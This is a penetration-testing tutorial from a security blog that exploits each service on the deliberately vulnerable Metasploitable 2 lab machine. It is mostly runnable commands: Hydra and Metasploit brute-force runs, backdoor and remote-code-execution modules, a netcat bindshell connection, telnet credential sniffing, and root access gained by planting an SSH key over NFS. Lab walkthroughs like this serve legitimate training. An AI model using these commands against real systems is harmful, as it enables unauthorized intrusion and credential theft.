<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Comprehensive Guide on Metasploitable 2</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/" rel="bookmark"><time class="entry-date published updated" datetime="2017-01-12T07:53:36+00:00">January 12, 2017</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">If you’ve ever tried to learn about pentesting you would have come across Metasploitable in one way or another. In this article, we will be exploiting all the services running in Metasploitable 2, so without further ado, let’s dive in.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Network Scan</span></li>
<li><span style="color: #000000;">Exploiting Port 21 FTP (Hydra)</span></li>
<li><span style="color: #000000;">Exploiting VSFTPD 2.3.4</span></li>
<li><span style="color: #000000;">Exploiting Port 22 SSH</span></li>
<li><span style="color: #000000;">Bruteforce Port 22 SSH (RSA Method)</span></li>
<li><span style="color: #000000;">Exploiting port 23 TELNET (Credential Capture)</span></li>
<li><span style="color: #000000;">Exploiting TELNET (Bruteforce)</span></li>
<li><span style="color: #000000;">Port 25 SMTP User Enumeration</span></li>
<li><span style="color: #000000;">Exploiting Port 80 (PHP)</span></li>
<li><span style="color: #000000;">Exploiting Port 139 &amp; 445 (Samba)</span></li>
<li><span style="color: #000000;">Exploiting Port 8080 (Java)</span></li>
<li><span style="color: #000000;">Exploiting Port 5432 (Postgres)</span></li>
<li><span style="color: #000000;">Exploiting Port 6667 (UnrealIRCD)</span></li>
<li><span style="color: #000000;">Exploiting Port 36255</span></li>
<li><span style="color: #000000;">Remote Login Exploitation</span></li>
<li><span style="color: #000000;">Remote Shell Exploitation</span></li>
<li><span style="color: #000000;">Exploiting Port 8787</span></li>
<li><span style="color: #000000;">Bindshell</span></li>
<li><span style="color: #000000;">Exploiting Port 5900 (VNC)</span></li>
<li><span style="color: #000000;">Access Port 2121 (ProFTPD)</span></li>
<li><span style="color: #000000;">Exploiting Port 8180 (Apache Tomcat)</span></li>
<li><span style="color: #000000;">Privilege Escalation via NFS</span></li>
<li><span style="color: #000000;">Exploiting Port 3306 (MYSQL)</span></li>
</ul>
<h3><span style="color: #800000;">Network Scan</span></h3>
<p><span style="color: #000000;">The first step towards doing what we want to achieve is a service scan that looks at all the 65535 ports of Metasploitable 2 to see what’s running where and with what version. You will notice the result in the image below.</span></p>
<pre class="lang:default decode:true">nmap -p- -sV 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-b_W50rsxCbg/XDmYQZpiS0I/AAAAAAAAcBs/9tm2lHppSiIQlkN0Cw-jJpwo-ZU7ilFdwCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 21: FTP</span></h3>
<p><span style="color: #000000;">We have all our ports and services listed now, let’s start by Exploiting port 21 running FTP. We will be using Hydra for this. The two wordlists for this operation will have default login names and passwords.</span></p>
<p><span style="color: #000000;">Hydra shows us that we have 4 valid login ID’s and passwords.</span></p>
<pre class="lang:default decode:true">hydra -L user.txt -P pass.txt 192.168.1.103 ftp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WZjWItXf_ZM/XDmYSz0zgMI/AAAAAAAAcCU/Vj1c4L8p4kUe8a1cTnKcX1T_5z6ygQ_IQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Let’s put our findings to use and try to connect using FTP.</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XMqnRQb8nCQ/XDmYUkKQ3gI/AAAAAAAAcCw/lPBXEcwnilEnsZboemIVVbKnprvcQPbkACLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Exploiting VSFTPD 2.3.4</span></h3>
<p><span style="color: #000000;">We have exploited the service running on port 21, now we will exploit the particular version of the FTP service. We will be searching for an exploit for VSFTPD 2.3.4 using Searchsploit.</span></p>
<pre class="lang:default decode:true">searchsploit vsftpd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OAQeJ7dZxpg/XDmYVe1aSqI/AAAAAAAAcC8/NQwvlNau_jA4gE_19SLinoOw2d-KjkTvQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We now have our exploit, let’s get into Metasploit and run it.</span></p>
<p><span style="color: #000000;">This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th, 2011 and July 1st, 2011 according to the most recent information available. This backdoor was removed on July 3rd, 2011.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit (unix/ftp/vsftpd_234_backdoor) &gt; set rhost 192.168.1.103
msf exploit (unix/ftp/vsftpd_234_backdoor) &gt; exploit</pre>
<p><span style="color: #000000;">And as you can observe, we have owned the command shell of the remote machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rKLNYF-T7UE/XDmYWfCbb-I/AAAAAAAAcDM/ZwMZ-jeVQ6AU37HKLJZKiyfOgGpcPxP7gCLcBGAs/s1600/5.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 22 SSH</span></h3>
<p><span style="color: #000000;">Metasploit has an auxiliary function that we will use on the SSH service running on port 22. One we get our session through it we will be upgrading it to Meterpreter.</span></p>
<p><span style="color: #000000;">This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary (scanner/ssh/ssh_login) &gt; set rhosts 192.168.1.103
msf auxiliary (scanner/ssh/ssh_login) &gt; set user_file /root/Desktop/user.txt
msf auxiliary (scanner/ssh/ssh_login) &gt; set pass_file /root/Desktop/pass.txt
msf auxiliary (scanner/ssh/ssh_login) &gt; exploit</pre>
<p><span style="color: #000000;">And as you can observe, again we have owned the command shell of the remote machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-CxrRP6zMn68/XDmYWtoTjVI/AAAAAAAAcDQ/u6SCCHvebkEfT4QM8J3o9SRnx139nNDRwCLcBGAs/s1600/6.png"/></span></p>
<h3><span style="color: #800000;">Bruteforce Port 22 SSH (RSA Method)</span></h3>
<p><span style="color: #000000;">This time we will brute-force the SSH service using a <a style="color: #000000;" href="https://www.exploit-db.com/exploits/5720">5720.py. exploit</a>. The exploit comes with RSA keys that it used to bruteforce the root login. We will basically be running the exploit by giving it the path to the RSA keys we want to use and the IP of the target machine. Here’s how it works.</span></p>
<pre class="lang:default decode:true">python 5720.py 5622/rsa/2048/ 192.168.1.103 root</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-l0LU2gQ4gQU/XDmYW6MMavI/AAAAAAAAcDU/wglPLEIanxY8HCoNjS4nmiPwM_72ZZTLQCLcBGAs/s1600/7.1.png"/></strong></span></p>
<p><span style="color: #000000;">Success! It finds the right key pretty quick and gives the exact command to execute to get a successful connection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-kd6pT3q4Dfg/XDmYXODatCI/AAAAAAAAcDc/Vt30u3Eh0V8m8753ECEFXVxhFyF979IzQCLcBGAs/s1600/7.2.png"/></span></p>
<h3><span style="color: #800000;">Exploiting port 23 TELNET (Credential Capture)</span></h3>
<p><span style="color: #000000;">We are using Wireshark to capture the TCP traffic, it is set to run in the background while we connect to Metasploitable 2 through telnet using “msfadmin” as credentials for user name and password.</span></p>
<pre class="lang:default decode:true">telnet 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XExsGkuoL1E/XDmYXEg9lQI/AAAAAAAAcDY/98P7JkzKfME_wk-92SZeUB2F0xOG9T_cACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Once successfully connected we go back to Wireshark. Now we click the “TCP Stream” option under Analyze &gt; Follow. This shows us the login credentials in plain text.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3tBroFlNZTE/XDmYQR8zOYI/AAAAAAAAcBk/ICNqDV8XAM8ptEDOfPrIqX9LI9wmbOZlgCLcBGAs/s1600/10.png"/></span></p>
<h3><span style="color: #800000;">Exploiting TELNET</span></h3>
<p><span style="color: #000000;">This module will test a telnet login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. The same password and user file from earlier will be used for this.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/scanner/telnet/telnet_login
msf auxiliary (scanner/telnet/telnet_login) &gt; set rhosts 192.168.1.103
msf auxiliary (scanner/telnet/telnet_login) &gt; set user_file /root/Desktop/user.txt
msf auxiliary (scanner/telnet/telnet_login) &gt; set pass_file /root/Desktop/pass.txt
msf auxiliary (scanner/telnet/telnet_login) &gt; set stop_on_success true
msf auxiliary (scanner/telnet/telnet_login) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--qZwoSWuGSY/XDmYQTUl5LI/AAAAAAAAcBo/LqCJ2vP8hh0u_ue4RjfYzpG3pc0fhxgGQCLcBGAs/s1600/11.png"/></span></p>
<h3><span style="color: #800000;">Port 25 SMTP User Enumeration</span></h3>
<p><span style="color: #000000;">Kali comes with a tool called “<em>Smtp-User-Enum</em>”, it has multiple modes that deal with different facets of SMTP, we will be using it to verify which SMTP usernames exist in victim machine.</span></p>
<p><span style="color: #000000;">We will see that the tool lets us know which all usernames exist that I have saved in my user.txt file.</span></p>
<pre class="lang:default decode:true">smtp-user-enum -M VRFY -U user.txt -t 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jz85xbF_5Q0/XDmYQ3Lq4WI/AAAAAAAAcBw/Zx0MC7kk-1MDgPepITMFsLUuTjOgvyK9wCLcBGAs/s1600/12.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 80 (PHP_CGI)</span></h3>
<p><span style="color: #000000;">We know that port 80 is open so we type in the IP address of Metasploitable 2 in our browser and notice that it is running PHP. We dig a little further and find which version of PHP is running and also that it is being run as a CGI. We will now exploit the argument injection vulnerability of PHP 2.4.2 using Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xtkz3XFh3h8/XDmYRYYH6pI/AAAAAAAAcB4/ghs87g4RPeUFj4eqstPzlo0EUyFM_koAgCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">When running as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability. This module takes advantage of the -d flag to set php.ini directives to achieve code execution. From the advisory: “if there is NO unescaped ‘=’ in the query string, the string is split on ‘+’ (encoded space) characters, url decoded, passed to a function that escapes shell metacharacters (the “encoded in a system-defined manner” from the RFC) and then passes them to the CGI binary.” This module can also be used to exploit the Plesk 0day disclosed by kingcope and exploited in the wild in June 2013.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/http/php_arg_injection
msf exploit (multi/http/php_arg_injection) &gt; set rhost 192.168.1.103
msf exploit (multi/http/php_arg_injection) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BNf7PdGCyoo/XDmYRY6rs5I/AAAAAAAAcB0/Q_ngyciJmYQkwttTST-qZvbsSNWc6_LMgCLcBGAs/s1600/14.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 139 &amp; 445 (Samba)</span></h3>
<p><span style="color: #000000;">Samba is running on both port 139 and 445, we will be exploiting it using Metasploit. The default port for this exploit is set to port 139 but it can be changed to port 445 as well.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/samba/usermap_script
msf exploit (multi/samba/usermap_script) &gt; set rhost 192.168.1.103
msf exploit (multi/samba/usermap_script) &gt; exploit
</pre>
<p><img decoding="async" style="color: #000000;" src="https://3.bp.blogspot.com/-yDMHSLMRxT0/XDmYRoukiEI/AAAAAAAAcB8/Un5In8j4B1MVmfXDhvNZ7-9V8e3ZusF8wCLcBGAs/s1600/15.png"/></p>
<h3><span style="color: #800000;">Exploiting Port 8080 (Java)</span></h3>
<p><span style="color: #000000;">This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication.</span></p>
<p><span style="color: #000000;">We will be using the Remote Method Invocation exploit on the Java service running on port 8080. It’s quite straight forward, just choose the exploit, set the target machine IP and that’s it.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/misc/java_rmi_server
msf exploit(multi/misc/java_rmi_server) &gt; set rhost 192.168.1.103
msf exploit(multi/misc/java_rmi_server) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PofLA5vWEsY/XDmYRyJlRqI/AAAAAAAAcCE/kOSHIIRtcEYrs7zINwZFGY8RcbXcVvCTwCLcBGAs/s1600/16.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 5432 (Postgres)</span></h3>
<p><span style="color: #000000;">Postgres is associated with SQL is runs on port 5432 and we have a great little exploit that can be used here.</span></p>
<p><span style="color: #000000;">On some default Linux installations of PostgreSQL, the Postgres service account may write to the /tmp directory and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object’s constructor, it does not need to conform to specific Postgres API versions.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/linux/postgres/postgres_payload
msf exploit (linux/postgres/postgres_payload) &gt; set rhost 192.168.1.103
msf exploit (linux/postgres/postgres_payload) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-I2D_ucGKukQ/XDmYR0f2xyI/AAAAAAAAcCA/zZz-_7a9oPc2MEVYoYBciWYtlXQ0o2HRwCLcBGAs/s1600/17.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 6667 (UnrealIRCD)</span></h3>
<p><span style="color: #000000;">Port 6667 has the Unreal IRCD service running, we will exploit is using a backdoor that’s available in Metasploit.</span></p>
<p><span style="color: #000000;">This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th, 2010.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit (unix/irc/unreal_ircd_3281_backdoor) &gt; set rhost 192.168.1.103
msf exploit (unix/irc/unreal_ircd_3281_backdoor) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QDPbKx93RL4/XDmYSJnh3nI/AAAAAAAAcCI/aNDYrUDt394cd7txViopGyaVUQ2K8JVxACLcBGAs/s1600/18.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 36255</span></h3>
<p><span style="color: #000000;">This is a weakness that allows arbitrary commands on systems running distccd. We will be using Distcc Daemon Command Execution. This module uses a documented security weakness to execute arbitrary commands on any system running distccd.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/unix/misc/distcc_exec
msf exploit (unix/misc/distcc_exec) &gt; set rhost 192.168.1.103
msf exploit (unix/misc/distcc_exec) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tTQZGDheRw0/XDmYSs70gQI/AAAAAAAAcCM/bPsBc27KQlEWuslRALrX_VYMQA0fSH1bgCLcBGAs/s1600/19.png"/></span></p>
<h3><span style="color: #800000;">Remote Login Exploitation</span></h3>
<p><span style="color: #000000;">A remote login is a tool that was used before ssh came into the picture. Since we have the login credentials for Metasploitable 2, we will be using Rlogin to connect to it, using the “-l” flag to define the login name.</span></p>
<pre class="lang:default decode:true">rlogin -l msfadmin 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UfaceXQDHDk/XDmYTHqB_fI/AAAAAAAAcCY/I0aznq46x5k4pW_DnlMwKbvpRyLg5AhqwCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Metasploit has a module in its auxiliary section that we can use to get into the rlogin.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/scanner/rservices/rlogin_login
msf auxiliary (scanner/rservices/rlogin_login) &gt; set rhosts 192.168.1.103
msf auxiliary (scanner/rservices/rlogin_login) &gt; set username root
msf auxiliary (scanner/rservices/rlogin_login) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UfaceXQDHDk/XDmYTHqB_fI/AAAAAAAAcCY/I0aznq46x5k4pW_DnlMwKbvpRyLg5AhqwCLcBGAs/s1600/21.png"/></span></p>
<h3><span style="color: #800000;">Remote Shell Exploitation</span></h3>
<p><span style="color: #000000;">Remote shell Protocol is another way to gain a remote shell, it is a legitimate service that we will use to access the target machine with login credentials to run a certain command.</span></p>
<pre class="lang:default decode:true">rsh -l msfadmin 192.168.1.103 ifconfig</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SPF4qt0mGoI/XDmYTmYimNI/AAAAAAAAcCc/0bsy__kw46wEYb-ojpicf8Adt2x59A68ACLcBGAs/s1600/23.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Distributed Ruby Remote Code Execution (8787)</span></h3>
<p><span style="color: #000000;">Now that we know that this service is running successfully, let’s try to exploit it using Metasploit.</span></p>
<p><span style="color: #000000;">This module exploits remote code execution vulnerabilities in dRuby.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/linux/misc/drb_remote_codeexec
msf exploit (linux/misc/drb_remote_code) &gt; set rhost 192.168.1.103
msf exploit (linux/misc/drb_remote_code) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5pN98n7dwac/XDmYTl_FHQI/AAAAAAAAcCg/0sF6-UUCrj4_dLyrbpkkOhpav6E-Cp4YQCLcBGAs/s1600/25.png"/></span></p>
<h3><span style="color: #800000;">Bindshell Exploitation</span></h3>
<p><span style="color: #000000;">Metasploitable 2 comes with an open bindshell service running on port 1524. We will be using Netcat to connect to it.</span></p>
<pre class="lang:default decode:true">nc 192.168.1.103 1524</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YzCRgwuljq4/XDmYT2Juy1I/AAAAAAAAcCk/6Svj7nZ_xQEkmKUCZlD8whK_e1LGxp4QwCLcBGAs/s1600/26.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 5900 (VNC)</span></h3>
<p><span style="color: #000000;">Virtual Network Computing or VNC service runs on port 5900, this service can be exploited using a module in Metasploit to find the login credentials.</span></p>
<p><span style="color: #000000;">This module will test a VNC server on a range of machines and report successful logins. Currently, it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge-response authentication method.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/scanner/vnc/vnc_login
msf auxiliary (scanner/vnc/vnc_login) &gt; set login 192.168.1.103
msf auxiliary (scanner/vnc/vnc_login) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-RcssuP-0B3Q/XDmYUKdz4pI/AAAAAAAAcCo/h-KNzjiVyuEEKemyLaoIffXaNa_5eQYOwCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Let’s put what we’ve found to the test by connecting using the vncviewer</span></p>
<pre class="lang:default decode:true">vncviewer 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OH5G6Qi22R8/XDmYUlzXIeI/AAAAAAAAcCs/aWRvDcBBuU8a4AglD6iovww6OqCETPfLgCLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;">The credentials work and we have a remote desktop session that pops up in Kali.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Et-JoCDvRPk/XDmYUn4SlaI/AAAAAAAAcC0/vkiuFl8vb9gGfuZFB3aTnshGIvY5ohw1ACLcBGAs/s1600/29.png"/></span></p>
<h3><span style="color: #800000;">Access Port 2121 (ProFTPD)</span></h3>
<p><span style="color: #000000;">We will connect to the target machine using Telnet running on port 2121 using the default credentials for Metasplotable 2.</span></p>
<pre class="lang:default decode:true">telnet 192.168.1.103 2121</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dkMm-rrfSd8/XDmYVRyhjpI/AAAAAAAAcC4/HnhP2F9Xkd43fTkoOMxis0LUP92qDgvMgCLcBGAs/s1600/30.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 8180 (Apache Tomcat)</span></h3>
<p><span style="color: #000000;">We saw during the service scan that Apache Tomcat is running on port 8180.  Incidentally, Metasploit has an exploit for Tomcat that we can use to get a Meterpreter session. The exploit uses the default credentials used by Tomcat to gain access.</span></p>
<p><span style="color: #000000;">This module can be used to execute a payload on Apache Tomcat servers that have an exposed “manager” application. The payload is uploaded as a WAR archive containing a JSP application using a POST request against the /manager/html/upload component. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/http/tomcat_mgr_upload
msf exploit (multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.1.103
msf exploit (multi/http/tomcat_mgr_upload) &gt; set rpost 8108
msf exploit (multi/http/tomcat_mgr_upload) &gt; set httpusername tomcat
msf exploit (multi/http/tomcat_mgr_upload) &gt; set httppassword tomcat
msf exploit (multi/http/tomcat_mgr_upload) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ee4SnmFk2a4/XDmYVpQfX3I/AAAAAAAAcDA/eCHXCLIA8F0BBW-AKDQNv27ez03VZ4GegCLcBGAs/s1600/31.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation via Port 2049: NFS</span></h3>
<p><span style="color: #000000;">In this method, we will be creating an ssh key without a passphrase and exchanging it with the ssh key of the victim machine for the root user.</span></p>
<p><span style="color: #000000;">First, we use ssh-keygen to generate an RSA keypair without a key phrase, then we place it in the “/root/.ssh” folder where the key is found by default.  Once the key is created and placed, we will create a directory “/tmp/sshkey/” in our local machine.</span></p>
<p><span style="color: #000000;">The next part is a little tricky, we will be mounting the directory we just made on the victim machine using the Network File Sharing Function. Once mounted we write the key from our machine to the victim’s machine, a sort of an override, using the cat command. The thing to keep in mind here is that the key we have is without a passphrase so the after the override the key in the victim machine is also without a passphrase, so when it is connected using ssh, it’s using a blank password.</span></p>
<p><span style="color: #000000;">The key is now copied so we unmount the directory and connect as the root user using ssh.</span></p>
<pre class="lang:default decode:true ">showmount -e 192.168.1.103
ssh-keygen
mkdir /tmp/sshkey
mount -t nfs 192.168.1.103:/ /tmp/sshkey/
cat ~/ .ssh/id_rsa.pub &gt;&gt;/tmp/sshkey/root/.ssh/authorized_keys
umount /tmp/sshkey
ssh root@192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JQCEobQrLPo/XDmYV0B1YkI/AAAAAAAAcDE/jn9CO1gh3S04-zUBDtnJ_6BZrSOv0BQDQCLcBGAs/s1600/41.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Port 3306 (MYSQL)</span></h3>
<p><span style="color: #000000;">The MySQL database in Metasploitable 2 has negligible security, we will connect to it using the MySQL function of Kali by defining the username and host IP. The password will be left blank.</span></p>
<pre class="lang:default decode:true">mysql -u root -h 192.168.1.103 -p</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BMvgEnuxjks/XDmYWAVCYFI/AAAAAAAAcDI/Rq2Uk3QnzrsHywlHwwBsQoZj_ujdKofpACLcBGAs/s1600/42.png"/></span></p>
<p><span style="color: #000000;">This article is a gateway into the world of pentesting. Its intent is to give you a single source containing all the ways and means to exploit all the vulnerabilities of Metasploiable 2 classified by port’s and services, it doesn’t get any better than this.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
